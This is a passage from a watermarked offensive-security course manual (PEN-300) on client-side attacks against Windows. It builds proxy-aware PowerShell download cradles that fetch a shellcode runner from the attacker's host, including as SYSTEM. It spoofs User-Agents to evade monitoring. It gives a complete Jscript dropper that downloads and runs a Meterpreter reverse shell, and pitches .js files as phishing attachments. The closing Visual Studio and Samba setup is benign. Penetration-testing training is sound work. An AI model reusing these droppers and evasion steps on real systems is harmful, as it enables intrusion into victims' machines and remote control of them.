PS C:\Windows\SysWOW64\WindowsPowerShell\v1.0> 
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1") 
 
AbsolutePath   : / 
AbsoluteUri    : http://192.168.120.12:3128/ 
LocalPath      : / 
Authority      : 192.168.120.12:3128 
HostNameType   : IPv4 
IsDefaultPort  : False 
IsFile         : False 
IsLoopback     : False 
PathAndQuery   : / 
Segments       : {/} 
IsUnc          : False 
Host           : 192.168.120.12 
Port           : 3128 
Query          :  
Fragment       :  
Scheme         : http 
OriginalString : http://192.168.120.12:3128 
DnsSafeHost    : 192.168.120.12 
IdnHost        : 192.168.120.12 
IsAbsoluteUri  : True 
UserEscaped    : False 
UserInfo       :  
Listing 101 - Proxy settings used by Net.WebClient 
 
176 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.net.webrequest.defaultwebproxy?view=netframework-4.8 
177 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.net.webproxy.getproxy?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
96 
We can use this to quickly verify both the proxy server IP address and network port. Since the 
proxy settings are configured dynamically through the proxy property, we can remove them by 
simply creating an empty object as shown in Listing 102. 
$wc = new-object system.net.WebClient 
$wc.proxy = $null 
$wc.DownloadString("http://192.168.119.120/run.ps1") 
Listing 102 - Removing the proxy settings by “nulling” them 
Once again we can use the tail command to dump the latest entry of the Apache access logs 
and this time observe the HTTP request coming directly from the Windows 10 victim client. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
... 
192.168.120.11 - - [09/Jun/2020:08:19:36 -0400] "GET /run.ps1 HTTP/1.1" 200 4360 "-" 
"-" 
Listing 103 - HTTP request bypassing the proxy server 
In some environments, network communications not going through the proxy will get blocked at 
an edge firewall. Otherwise, we could bypass any monitoring that processes network traffic at the 
proxy. 
We can quite easily manipulate the proxy settings of our download cradle and as we’ll discuss in 
the next section, there is an additional property we may also tamper with. 
3.7.1.1 Exercises 
1. 
Setup the proxy configuration and verify whether or not the Net.WebClient download cradle 
is proxy-aware. 
2. 
Are other PowerShell download cradles proxy aware? 
3.7.2 Fiddling With The User-Agent 
We should also determine if the Net.WebClient download cradle can modify the User-Agent178 
property. 
When making HTTP or HTTPS requests from a web browser, one of the most easily identifiable 
characteristics of that session is the User-Agent. It quickly tells us which type of web browser or 
other application is performing the request along with the operating system version. The 
Net.WebClient PowerShell download cradle does not have a default User-Agent set, which means 
the session will stand out from other legitimate traffic. 
Luckily for us, we can customize this using the Headers179 property of the Net.WebClient object 
using the Add method. The download cradle code in Listing 104 shows a configured custom 
User-Agent. 
$wc = new-object system.net.WebClient 
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...") 
$wc.DownloadString("http://192.168.119.120/run.ps1") 
 
178 (Microsoft, 2019), https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent 
179 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.headers?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
97 
Listing 104 - Setting a custom User-Agent 
Running the code will download the file and leave behind the User-Agent text in the Apache 
access logs as we can verify by inspecting the latest entry. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
... 
192.168.120.12 - - [09/Jun/2020:08:32:57 -0400] "GET /run.ps1 HTTP/1.1" 304 182 "-" 
"This is my agent, there is no one like it..." 
Listing 105 - HTTP request with custom User-Agent 
Obviously, a User-Agent like the one used above sticks out even more than an empty User-Agent 
string. Instead, we should emulate a User-Agent from a real web browser like Google Chrome or 
Internet Explorer. 
3.7.2.1 Exercises 
1. 
Set a custom User-Agent in the download cradle and observe it in the Apache access logs. 
2. 
Instead of a custom User-Agent string, identify one used by Google Chrome and implement 
that in the download cradle. 
3.7.3 Give Me A SYSTEM Proxy 
So far, the Net.WebClient download cradle has been very versatile, but we must consider the side-
effects of using a SYSTEM integrity download cradle. 
When performing privilege escalation or exploiting an application running at SYSTEM integrity 
level, we may obtain a SYSTEM integrity shell. A PowerShell download cradle running in SYSTEM 
integrity level context does not have a proxy configuration set and may fail to call back to our C2 
infrastructure. 
We can verify this from a SysInternals PsExec180 SYSTEM integrity 32-bit PowerShell ISE 
command prompt. 
To demonstrate this, we’ll first open an elevated command prompt by right-clicking on the 
cmd.exe taskbar icon and selecting Run as administrator. In the new command prompt, we’ll 
navigate to the Sysinternals folder and execute PsExec.exe while specifying -s to run it as 
SYSTEM and -i to make it interactive with the current desktop. 
C:\Tools\Sysinternals> PsExec.exe -s -i 
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe 
Listing 106 - Opening a 32-bit PowerShell ISE prompt as SYSTEM 
While keeping the proxy settings enabled, we’ll run the basic Net.WebClient PowerShell download 
cradle repeated in Listing 107 from the SYSTEM integrity PowerShell ISE prompt. 
$wc = new-object system.net.WebClient 
$wc.DownloadString("http://192.168.119.120/run.ps1") 
Listing 107 - Basic Net.WebClient download cradle 
 
180 (Microsoft, 2016), https://docs.microsoft.com/en-us/sysinternals/downloads/psexec 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
98 
When the download cradle has completed, we’ll inspect the latest Apache access log. It reveals 
that the HTTP request came directly from the Windows 10 victim machine. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
... 
192.168.120.11 - - [09/Jun/2020:08:22:36 -0400] "GET /run.ps1 HTTP/1.1" 200 4360 "-" 
"-" 
Listing 108 - HTTP request bypassing the proxy server 
In order to run our session through a proxy, we must create a proxy configuration for the built-in 
SYSTEM account. One way to do this is to copy a configuration from a standard user account on 
the system. Proxy settings for each user are stored in the registry181 at the following path: 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings 
Listing 109 - Registry proxy path 
We can verify this by opening the registry editor and browsing to this path as shown in Figure 29. 
 
Figure 29: Process Monitor filter creation 
From here, we can collect the contents of the ProxyServer registry key and use it to populate the 
proxy properties of the Net.WebClient object. However, there is a problem in this. 
When navigating the registry, the HKEY_CURRENT_USER registry hive is mapped according to the 
user trying to access it, but when navigating the registry as SYSTEM, no such registry hive exists. 
However, the HKEY_USERS registry hive always exists and contains the content of all user 
HKEY_CURRENT_USER registry hives split by their respective SIDs.182 
 
181 (Microsoft, 2017), https://support.microsoft.com/en-us/help/819961/how-to-configure-client-proxy-server-settings-by-using-a-
registry-file 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
99 
As part of our download cradle, we can use PowerShell to resolve a registry key. But the 
HKEY_USERS registry hive is not automatically mapped. Nevertheless, we can map it with the 
New-PSDrive183 commandlet by specifying a name, the PSProvider as “Registry”, and Root as 
“HKEY_USERS”. 
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null 
Listing 110 - Mapping HKEY_USERS registry hive with PowerShell 
While we can now interact with and query the HKEY_USERS hive, we must decide which user’s 
hive we want to copy. The HKEY_USERS hive contains the hives of all users on the computer, 
including SYSTEM and other local service accounts, which we want to avoid. 
The registry hives are divided and named after the SIDs of existing users and there is a specific 
pattern. Any SID starting with “S-1-5-21-” is a user account exclusive of built-in accounts.184 
To obtain a valid user hive, we can loop through all top level entries of the HKEY_USERS until we 
find one with a matching SID. Once we find one, we can filter out the lower 10 characters leaving 
only the SID, while omitting the HKEY_USERS string. 
We can find all the top-level HKEY_USERS with the Get-ChildItem185 cmdlet and use a ForEach 
loop to find the first that contains a SID starting with “S-1-5-21-”. 
Once we find the first record, we’ll save it in the $start variable and exit the loop through the 
break186 statement as displayed in Listing 111. 
$keys = Get-ChildItem 'HKU:\' 
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = 
$key.Name.substring(10);break}} 
Listing 111 - Finding a user hive based on SID 
To fetch the content of the registry key, we’ll use the Get-ItemProperty187 cmdlet as shown in 
Listing 112. 
Get-ItemProperty accepts the path (-Path) for the registry key, but since we manually mapped the 
HKEY_USERS registry hive, we must specify it before the registry path and key we desire, 
eliminating the need to specify the “HKEY_USERS” string. 
$proxyAddr=(Get-ItemProperty -Path 
"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer 
Listing 112 - Fetching the proxy settings from registry key 
 
182 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/security-identifiers 
183 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-
psdrive?view=powershell-6 
184 (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids 
185 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-
childitem?view=powershell-6 
186 (Microsoft, 2017), https://docs.microsoft.com/en-
us/powershell/module/microsoft.powershell.core/about/about_break?view=powershell-6 
187 (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-
itemproperty?view=powershell-6 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
100 
The code shown above gathers the proxy server IP address and network port from the registry 
and assigns it to the $proxyAddr variable. Now we must turn the contents of the variable into a 
proxy object that we can assign to our Net.WebClient object. 
To do this, we’ll create a new object from the WebProxy188 class and assign it as the 
DefaultWebProxy that is built into all Net.WebClient objects. The constructor takes one argument, 
which is the URL and port of the proxy server, i.e.: the value we have just resolved from the 
registry. 
$proxyAddr=(Get-ItemProperty -Path 
"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer 
[system.net.webrequest]::DefaultWebProxy = new-object 
System.Net.WebProxy("http://$proxyAddr") 
$wc = new-object system.net.WebClient 
$wc.DownloadString("http://192.168.119.120/run.ps1") 
Listing 113 - Create and assign proxy object for the SYSTEM user 
Now we have all the pieces needed to create a proxy-aware PowerShell download cradle running 
in SYSTEM integrity. Let’s assemble all the code segments into the code shown in Listing 114. 
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null 
$keys = Get-ChildItem 'HKU:\' 
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = 
$key.Name.substring(10);break}} 
$proxyAddr=(Get-ItemProperty -Path 
"HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer 
[system.net.webrequest]::DefaultWebProxy = new-object 
System.Net.WebProxy("http://$proxyAddr") 
$wc = new-object system.net.WebClient 
$wc.DownloadString("http://192.168.119.120/run2.ps1") 
Listing 114 - Full code for SYSTEM integrity proxy aware download cradle 
Notice that we have changed the name of the PowerShell shellcode runner script from run.ps1 to 
run2.ps1 in the last line of the script since PowerShell may cache the file and affect our results. 
When running the complete code, be aware that mapping HKEY_USERS will 
persist across reruns of the code so the PowerShell_ISE prompt must be closed 
for the full code to run if previous incremental steps have been executed. 
Before executing the updated PowerShell script, we’ll make a copy of the run2.ps1 PowerShell 
shellcode runner in the Kali web root. 
Once executed, the download cradle will now use the correct proxy server. We can observe this in 
the last entry of the Apache access logs: 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
... 
 
188 (Microsoft, 2019), https://docs.microsoft.com/en-us/dotnet/api/system.net.webproxy?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
101 
192.168.120.12 - - [09/Jun/2020:14:47:25 -0400] "GET /run2.ps1 HTTP/1.1" 304 182 "-" 
"-" 
Listing 115 - Apache access log entry after SYSTEM download cradle 
The HTTP request is routed through the proxy server and will allow our download cradle to call 
back to our C2 even when all traffic must go through the proxy. 
Now our download cradle is versatile enough to handle communication through a proxy, even as 
SYSTEM. 
3.7.3.1 Exercise 
1. 
Recreate the steps in this section to obtain a HTTP request through the proxy. 
3.8 Wrapping Up 
In this module, we focused on exploiting the user’s behavior and discussed how to craft 
convincing pretexts. We introduced client-side execution and discussed how malware can 
operate through Microsoft Office and PowerShell. We greatly improved our tradecraft to execute 
arbitrary Win32 APIs directly in memory from either VBA or PowerShell, and included network 
proxy support. 
Gaining an initial shell on a client is a crucial first step. We’ll discuss other techniques for this 
critical skill in later modules. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
102 
 
4 Client Side Code Execution With Windows Script Host 
As discussed in the previous module, Microsoft Office VBA macros are an effective and popular 
way to gain client-side code execution. However, JavaScript attachments are equally effective for 
this task, and have recently gained in popularity.189 
In this module, we’ll use the Jscript190 file format to execute Javascript on Windows targets 
through the Windows Script Host.191 Specifically, we will use these Jscript droppers to execute 
powerful client-side attacks. 
Examples of recent advanced Jscript-based malware strains include TrickBot192 
and Emotet,193 both of which are under constant development. 
We’ll begin with a simple dropper that opens a command prompt and gradually improve our 
attack by reflectively loading pre-compiled C# assembly to execute our shellcode runner 
completely in memory. 
Let’s begin with a foundational discussion about the JavaScript language. 
4.1 Creating a Basic Dropper in Jscript 
The primary client scripting language for web browsers is JavaScript, which is an interpreted 
language that is processed inside the browser and commonly works together with HTML and 
CSS to create most of the content on the World Wide Web. The functionality of JavaScript is 
based on the ECMAScript194 standard. 
Jscript is a dialect of JavaScript developed and owned by Microsoft that is used in Internet 
Explorer. It can also be executed outside the browser through the Windows Script Host,195 which 
can execute scripts in a variety of languages. 
When executed outside of a web browser, Jscript is not subject to any of the security restrictions 
enforced by a browser sandbox. This means we can use it as a client-side code execution vector 
without exploiting any vulnerabilities. 
 
189 (Sophos, 2019), https://www.sophos.com/en-us/security-news-trends/security-trends/malicious-javascript.aspx 
190 (Wikipedia, 2019), https://en.wikipedia.org/wiki/JScript 
191 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wscript 
192 (Bromium, 2019), https://www.bromium.com/deobfuscating-ostap-trickbots-javascript-downloader/ 
193 (Security Soup, 2019), https://security-soup.net/a-quick-look-at-emotets-updated-javascript-dropper/ 
194 (Wikipedia, 2019), https://en.wikipedia.org/wiki/ECMAScript 
195 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Windows_Script_Host 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
103 
4.1.1 Execution of Jscript on Windows 
In order to use a file type in a phishing attack, it must be easily executable. For this reason, some 
file types are better suited for phishing attacks than others. To demonstrate this, let’s inspect 
PowerShell and Jscript files on our victim machine and see how they are handled by Windows. 
In Windows, a file’s format is identified by the file extension and not its actual content. 
Additionally, file extensions are often associated with default applications. To view these 
associations, we can navigate to Settings > Apps > Default apps, scroll to the bottom, and click on 
Choose default apps by file type as displayed in Figure 30. 
 
Figure 30: Default apps by file type 
Scrolling down the list, we notice that the default application for PowerShell scripting files (.ps1) is 
Notepad. This means that if we double-click on a PowerShell script, it will not be executed but 
instead will be opened for editing in Notepad. Because of this, even if we were able to convince 
the victim to double-click a PowerShell file, it would not be executed. 
On the other hand, the default application for .js files is the Windows-Based Script Host. This 
means that if we double-click a .js file, the content will be executed. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
104 
As mentioned previously, executing Jscript outside the context of a web browser bypasses all 
security settings. This allows us to interact with the older ActiveX196 technology and the Windows 
Script Host engine itself. Let’s discuss what we can do with this combination. 
As shown in the code in Listing 116, we can leverage ActiveX by invoking the ActiveXObject197 
constructor by supplying the name of the object. We can then use WScript.Shell to interact with 
the Windows Script Host Shell to execute external Windows applications. For example, we can 
instantiate a Shell object named “shell” from the WScript.Shell class through the ActiveXObject 
constructor to run cmd.exe through the Run command: 
var shell = new ActiveXObject("WScript.Shell") 
var res = shell.Run("cmd.exe"); 
Listing 116 - Jscript launching cmd.exe through ActiveX 
After saving the code to a file with the .js extension and double-clicking it, the script is executed 
and launches a command prompt. The Windows Script Host itself exits as soon as the Jscript file 
is complete so we don’t see it in Process Explorer. 
In the next section, we’ll build upon this to create a Jscript dropper that will execute a Meterpreter 
reverse shell. 
4.1.1.1 Exercises 
1. 
Create a simple Jscript file that opens an application. 
2. 
Look through the list of default applications related to file types. Are there any other 
interesting file types we could leverage? 
3. 
The .vbs extension is also linked to the Windows Script Host format. Write a simple VBScript 
file to open an application. 
4.1.2 Jscript Meterpreter Dropper 
Next, we’ll expand our usage of Jscript to create a dropper that downloads a Meterpreter 
executable from our Kali Linux web server and executes it. This will require several components. 
First, we’ll use msfvenom to generate a 64-bit Meterpreter reverse HTTPS executable named 
met.exe and save it to our Kali web root. We’ll also set up a Metasploit multi/handler to catch the 
session. 
With our executable generated and our handler waiting, let’s begin building our dropper code. 
We’ll start with a simple HTTP GET request from Jscript. 
To do that, we can use the MSXML2.XMLHTTP object, which is based on the Microsoft XML Core 
Services,198 and its associated HTTP protocol parser. This object provides client-side protocol 
support to communicate with HTTP servers. Although it is not documented, it is present in all 
modern versions of Windows. 
 
196 (Wikipedia, 2019), https://en.wikipedia.org/wiki/ActiveX 
197 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Archive/Web/JavaScript/Microsoft_Extensions/ActiveXObject 
198 (Wikipedia, 2019), https://en.wikipedia.org/wiki/MSXML 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
105 
As shown in Listing 117, we can use the CreateObject method of the Windows Script Host to 
instantiate the MSXML2.XMLHTTP object, and then use Open and Send methods to perform an 
HTTP GET request. The Open method takes three arguments. The first is the HTTP method, 
which in our case is GET. The second argument is the URL, and the third argument indicates that 
the request should be synchronous. 
To summarize our code, we’ll use the (url) variable to set the URL of the Meterpreter executable. 
Then we’ll create a Windows Script MSXML2.XMLHTTP object and call the Open method on that 
object to specify a GET request along with the URL. Finally, we’ll send the GET request to 
download the file. 
var url = "http://192.168.119.120/met.exe" 
var Object = WScript.CreateObject('MSXML2.XMLHTTP'); 
 
Object.Open('GET', url, false); 
Object.Send(); 
Listing 117 - HTTP GET request from Jscript 
Now that we have sent the HTTP GET request, we’ll perform two actions. The first is to detect if 
the request was successful. This can be done by checking the Status199 property of the 
MSXML2.XMLHTTP object and comparing it to the value “200”, the HTTP OK200 status code. We 
can do this with an if statement: 
if (Object.Status == 200) 
{ 
Listing 118 - Checking the HTTP status 
After receiving a successful status, we’ll create a Stream201 object and copy the HTTP response 
into it for further processing. The Stream object is instantiated from ADODB.Stream through the 
CreateObject method. 
var Stream = WScript.CreateObject('ADODB.Stream'); 
Listing 119 - Creating a Stream object 
Next, we’ll invoke Open202 on the Stream object and begin editing the properties of the stream. 
First, we’ll set the Type203 property (adTypeBinary) to “1” to indicate we are using binary content. 
Next, we’ll call the Write204 method to save the ResponseBody205 (our Meterpreter executable) to 
the stream. 
Finally, we’ll reset the Position206 property to “0” to instruct the Stream to point to the beginning of 
its content. 
 
199 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms767625%28v%3dvs.85%29 
200 (Mozilla, 2019), https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200 
201 (W3Schools, 2019), https://www.w3schools.com/asp/ado_ref_stream.asp 
202 (W3Schools, 2019), https://www.w3schools.com/asp/met_stream_open.asp 
203 (W3Schools, 2019), https://www.w3schools.com/asp/prop_stream_type.asp 
204 (W3Schools, 2019), https://www.w3schools.com/asp/met_stream_write.asp 
205 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms753682%28v%3dvs.85%29 
206 (W3Schools, 2019), https://www.w3schools.com/asp/prop_stream_position.asp 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
106 
Stream.Open(); 
Stream.Type = 1; // adTypeBinary 
Stream.Write(Object.ResponseBody); 
Stream.Position = 0; 
Listing 120 - Writing the Stream object 
So far, we have sent a GET request for our met.exe file, and have validated that the request was 
successful. Next, we wrote the binary content to our ADODB stream. Now, with the content stored 
in the Stream object, we must create a file and write the binary content to it. As shown in Listing 
121, we can use the SaveToFile207 method. 
This method takes two arguments: the first is the filename and second are the save options, 
SaveOptionsEnum. We’ll set the filename to met.exe and set the SaveOptionsEnum to 
adSaveCreateOverWrite, with the numerical value of “2” to force a file overwrite. After we perform 
the SaveToFile action, we need to Close208 the Stream object: 
Stream.SaveToFile("met.exe", 2); 
Stream.Close(); 
Listing 121 - Saving the Meterpreter executable to disk 
As a final step, we’ll reuse the Windows Script Host Shell to execute the newly written Meterpreter 
executable. 
var r = new ActiveXObject("WScript.Shell").Run("met.exe"); 
Listing 122 - Running the Meterpreter executable 
The complete Jscript code to download and execute our Meterpreter shell is displayed below in 
Listing 123. 
var url = "http://192.168.119.120/met.exe" 
var Object = WScript.CreateObject('MSXML2.XMLHTTP'); 
 
Object.Open('GET', url, false); 
Object.Send(); 
 
if (Object.Status == 200) 
{ 
    var Stream = WScript.CreateObject('ADODB.Stream'); 
 
    Stream.Open(); 
    Stream.Type = 1; 
    Stream.Write(Object.ResponseBody); 
    Stream.Position = 0; 
 
    Stream.SaveToFile("met.exe", 2); 
    Stream.Close(); 
} 
 
var r = new ActiveXObject("WScript.Shell").Run("met.exe"); 
Listing 123 - Complete Jscript code to download and execute Meterpreter shell 
 
207 (W3Schools, 2019), https://www.w3schools.com/asp/met_stream_savetofile.asp 
208 (W3Schools, 2019), https://www.w3schools.com/asp/met_stream_close.asp 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
107 
After saving this code as a .js file, all we need to do is double-click it to get a 64-bit shell from the 
victim’s machine to our awaiting multi/handler listener. 
Now that we’ve covered the basics of Jscript, we’ll again expand our tradecraft to implement an 
in-memory shellcode runner. Sadly, there is no way to implement this directly in Jscript so we 
must rely on a second language. 
4.1.2.1 Exercises 
1. 
Replicate the Jscript file from this section. 
2. 
Modify the Jscript code to make it proxy-aware with the setProxy209 method. You can use the 
Squid proxy server installed on the Windows 10 development machine. 
4.2 Jscript and C# 
To improve our Jscript tradecraft, and run our payload completely from memory, we’ll again 
invoke Win32 APIs just as we did in the Microsoft Office module. 
Previously, we used PowerShell for this. However, since PowerShell has been used for many 
years by both penetration testers and malware authors, security solution providers (Microsoft 
included) have tried to take steps against malicious use of it. In this module, we will instead 
leverage C# which has, until recently, not been in the spotlight. This could reduce our profile and 
may help avoid detection. 
Since there’s no known way to invoke the Win32 APIs directly from Jscript, we’ll instead embed a 
compiled C# assembly in the Jscript file and execute it. This will give us the same capabilities as 
PowerShell since we will have comparable access to the .NET framework. This is a powerful 
technique that has recently gained a lot of attention and popularity. 
Before we build this, let’s cover some basics of the C# development environment (Visual 
Studio210), which is already installed on the Windows 10 development machine. 
4.2.1 Introduction to Visual Studio 
There are two primary integrated development environments (IDE)211 focused on developing and 
compiling C# applications: Mono212 and Microsoft Visual Studio. In this course, we will leverage 
Visual Studio, but most (if not all) code examples will also compile with Mono. 
Visual Studio is already installed on the Windows 10 development machine, but when it is 
reverted, all previously written code will be lost. To solve this issue, we’ll create a Kali Samba213 
share for our code to save our code between system reverts. 
To set up Samba on Kali, we’ll install it with apt, make a backup of its configuration file 
(smb.conf), and create a fresh configuration file as shown in Listing 124. 
 
209 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms760236%28v%3dvs.85%29 
210 (Microsoft, 2019), https://visualstudio.microsoft.com/ 
211 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Integrated_development_environment 
212 (Mono, 2019), https://www.mono-project.com/docs/about-mono/languages/csharp/ 
213 (Samba, 2019), https://www.samba.org/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
108 
kali@kali:~$ sudo apt install samba 
... 
kali@kali:~$ sudo mv /etc/samba/smb.conf /etc/samba/smb.conf.old 
 
kali@kali:~$ sudo nano /etc/samba/smb.conf 
Listing 124 - Installing Samba on Kali Linux 
We’ll create the new simple SMB configuration file with the contents given in Listing 125. If we 
choose to use a different user account, we can simply alter the path variable: 
[visualstudio] 
 path = /home/kali/data 
 browseable = yes 
 read only = no 
Listing 125 - New content of smb.conf 
Next, we need to create a samba user that can access the share and then start the required 
services as shown below: 
kali@kali:~$ sudo smbpasswd -a kali 
New SMB password: 
Retype new SMB password: 
Added user kali. 
 
kali@kali:~$ sudo systemctl start smbd 
 
kali@kali:~$ sudo systemctl start nmbd 
Listing 126 - Creating SMB user and starting services 
Finally, we’ll create the shared folder and open up the permissions for Visual Studio: 
kali@kali:~$ mkdir /home/kali/data 
 
kali@kali:~$ chmod -R 777 /home/kali/data 
Listing 127 - Creating the shared folder and setting permissions 
With everything set up, we’ll turn to our Windows 10 development machine. First, we’ll open the 
new share in File Explorer (\\192.168.119.120 in our case). When prompted, we’ll enter the 
username and password of the newly created SMB user and select the option to store the 
credentials. 
Now that our environment is set up, let’s create a new “Hello World” project. We’ll launch Visual 
Studio from the taskbar and choose Create a new project from the splash screen. 
Next, we’ll set the Language drop down menu to C# and select Console App (.NET Framework) as 
shown in Figure 31. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
109 
 
Figure 31: Selecting a C# Console App 
After selecting the project type and clicking next, we must set the Location of the project. In our 
case, we’ll use the visualstudio folder on our network share. For the remaining options, we’ll 
accept the default values and click Create. It may take some time to create the project. 
Once Visual Studio opens, we’ll find that we’ve created both a solution and a project. The solution 
is a parent unit that may contain multiple projects. 
Let’s take a moment to examine the basic workspace configuration. The first window to make 
note of is the Solution Explorer on the far right side, which can be thought of as the file and 
property explorer for the solution’s contents. Here we can see the source code file related to the 
current project, which in our case is named Program.cs as highlighted in Figure 32. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
110 
 
Figure 32: Using Solution Explorer 
On the left side of the workspace, we can inspect the contents of the file selected in the Solution 
Explorer. By default, this view will show the contents of Program.cs. The code for a typical C# 
console application is shown in Listing 128. 
using System; 
using System.Collections.Generic; 
using System.Linq; 
using System.Text; 
using System.Threading.Tasks; 
 
namespace ConsoleApp1 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
        } 
    } 
} 
Listing 128 - Default program stub for a C# console application 
Let’s highlight significant parts of the code. As shown in Listing 128, the first five lines contain 
using statements. These statements import the codebase from the .NET framework. Next, the 
Main method defines the entry point of our application when it is compiled. 
Let’s add a line of code inside the Main method to create our simple application. We will use the 
Console.WriteLine214 method to print some text to the console when the application is executed. 
using System; 
using System.Collections.Generic; 
using System.Linq; 
using System.Text; 
using System.Threading.Tasks; 
 
 
214 (Microsoft, 2018), https://docs.microsoft.com/en-us/dotnet/api/system.console.writeline?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
111 
namespace ConsoleApp1 
{ 
    class Program 
    { 
        static void Main(string[] args) 
        { 
            Console.WriteLine("Hello World"); 
        } 
    } 
} 
Listing 129 - Adding the call to Console.WriteLine 
With our code added, we can save the changes with either File > Save Program.cs or C+s. 
Next, we’ll modify the default solution settings before we compile our code. We’ll switch from 
Debug mode to Release215 mode to remove the debugging information that could trigger some 
security scanning software (Figure 33). 
 
Figure 33: Choosing between Debug and Release mode 
We can now compile our application by navigating to Build > Build Solution or Build > Build 
ConsoleApp1, which will compile the whole solution or just the current project, respectively. 
Whether the compilation succeeds or fails, we can view the output in the Output window at the 
bottom of Visual Studio (Figure 34). 
 
Figure 34: Output of the build process 
 
215 (Microsoft, 2018), https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-set-debug-and-release-
configurations?view=vs-2019 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
112 
 
Fortunately, our code compiled without any issues. The compilation output also tells us the path 
to the newly compiled executable. In our particular example, it saved to the following path: 
\\192.168.119.120\visualstudio\ConsoleApp1\ConsoleApp1\bin\Release\ConsoleApp1.exe 
Listing 130 - The path to our new executable 
We can now open a command prompt on our Windows machine and enter this path to execute 
our new program. After a few seconds, we are presented with “Hello World” as shown in Listing 
131. 
C:\Users\Offsec> 
\\192.168.119.120\visualstudio\ConsoleApp1\ConsoleApp1\bin\Release\ConsoleApp1.exe 
Hello World 
Listing 131 - Executing the Hello World application 
4.2.1.1 Exercises 
1. 
Set up the Samba share on your Kali system as shown in this section. 
2. 
Create a Visual Studio project and follow the steps to compile and execute the “Hello World” 
application. 
4.2.2 DotNetToJscript 
